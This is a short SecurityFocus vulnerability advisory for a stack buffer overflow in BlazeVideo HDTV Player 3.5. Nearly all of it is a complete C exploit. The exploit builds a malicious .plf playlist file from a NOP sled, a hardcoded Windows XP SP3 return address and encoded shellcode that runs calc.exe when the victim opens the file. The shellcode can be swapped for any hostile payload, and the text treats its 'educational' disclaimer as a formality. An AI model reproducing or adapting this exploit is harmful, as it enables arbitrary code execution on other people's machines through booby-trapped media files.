source: http://www.securityfocus.com/bid/30442/info

BlazeVideo HDTV Player is prone to a stack-based buffer-overflow vulnerability because the application fails to handle malformed playlist files.

An attacker can exploit this issue to execute arbitrary code within the context of the application or to trigger a denial-of-service condition.

BlazeVideo HDTV Player 3.5 is vulnerable; other versions may also be affected.

/*Blaze Video HDTV Player V 3.5 .PLF File Stack Buffer Overflow Exploit
  This sploit will create a special plf file,when you open this file
  calc.exe will be launched.Tested on Win XP Pro Sp3,if you run it on 
  another platform ,make sure you modify the retaddress in the sploit.
 Disclaimer
 This program was written for educational purpose. Use it at your own risk.Author 
 will be not be responsible for any damage.
 Credits for finging the bug and sploit go to fl0 fl0w. 
 Greetz to all romanian coderz !! 
 Contact me at flo_flow_supremacy@yahoo.com
 Have fun !
*/
#include<stdio.h>
#include<string.h>
#include<windows.h>
#include<stdlib.h>

#define EVILFILE "Romanian.plf"
#define FIRST "C:\\"
#define OFFSET 257

char shellcode[]=
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x37\x6a\x63"
"\x58\x30\x42\x30\x50\x42\x6b\x42\x41\x73\x41\x42\x32\x42\x41\x32"
"\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x38\x69\x69\x6c\x38"
"\x68\x41\x54\x77\x70\x57\x70\x75\x50\x6e\x6b\x41\x55\x55\x6c\x6e"
"\x6b\x43\x4c\x66\x65\x41\x68\x45\x51\x58\x6f\x4c\x4b\x50\x4f\x62"
"\x38\x6e\x6b\x41\x4f\x31\x30\x36\x61\x4a\x4b\x41\x59\x6c\x4b\x74"
"\x74\x6e\x6b\x44\x41\x4a\x4e\x47\x41\x4b\x70\x6f\x69\x6c\x6c\x4c"
"\x44\x4b\x70\x43\x44\x76\x67\x4b\x71\x4a\x6a\x66\x6d\x66\x61\x39"
"\x52\x5a\x4b\x4a\x54\x75\x6b\x62\x74\x56\x44\x73\x34\x41\x65\x4b"
"\x55\x4e\x6b\x73\x6f\x54\x64\x53\x31\x6a\x4b\x35\x36\x6c\x4b\x64"
"\x4c\x30\x4b\x6c\x4b\x73\x6f\x57\x6c\x75\x51\x6a\x4b\x6c\x4b\x37"
"\x6c\x6c\x4b\x77\x71\x68\x6b\x4c\x49\x71\x4c\x51\x34\x43\x34\x6b"
"\x73\x46\x51\x79\x50\x71\x74\x4c\x4b\x67\x30\x36\x50\x4c\x45\x4b"
"\x70\x62\x58\x74\x4c\x6c\x4b\x53\x70\x56\x6c\x4e\x6b\x34\x30\x47"
"\x6c\x4e\x4d\x6c\x4b\x70\x68\x37\x78\x58\x6b\x53\x39\x6c\x4b\x4f"
"\x70\x6c\x70\x53\x30\x43\x30\x73\x30\x6c\x4b\x42\x48\x77\x4c\x61"
"\x4f\x44\x71\x6b\x46\x73\x50\x72\x76\x6b\x39\x5a\x58\x6f\x73\x4f"
"\x30\x73\x4b\x56\x30\x31\x78\x61\x6e\x6a\x78\x4b\x52\x74\x33\x55"
"\x38\x4a\x38\x69\x6e\x6c\x4a\x54\x4e\x52\x77\x79\x6f\x79\x77\x42"
"\x43\x50\x61\x70\x6c\x41\x73\x64\x6e\x51\x75\x52\x58\x31\x75\x57"
"\x70\x63";


  int main()
 { FILE *p;
   unsigned char *buffer;
   unsigned int offset=0;
   unsigned int retaddress=0x7C8369F0;
   buffer=(unsigned char *)malloc(OFFSET+strlen(shellcode)+4+20+1);
   if((p=fopen(EVILFILE,"wb"))==NULL)
   { printf("error"); exit(0); } 
     
   memset(buffer,0x90,OFFSET+strlen(shellcode)+4+1);  
   offset=OFFSET;
   memcpy(buffer+offset,&retaddress,4);
   offset+=4+20;
   memcpy(buffer+offset,shellcode,strlen(shellcode));
   offset+=strlen(shellcode);
   memset(buffer+offset,0x00,1);
   fprintf(p,"%s%s",FIRST,buffer);
   printf("|--------------------------------------------------------------------------|\n");
   printf("Blaze Video HDTV Player V 3.5 .PLF File Stack Buffer Overflow Exploit\n");
   printf("Credits for finging the bug and sploit go to fl0 fl0w\n");
   printf(".PLF file done.. open with Blaze Player and have fun! \n" );
   printf("|--------------------------------------------------------------------------|\n");
   fclose(p);
   free(buffer);
  return 0; 
 }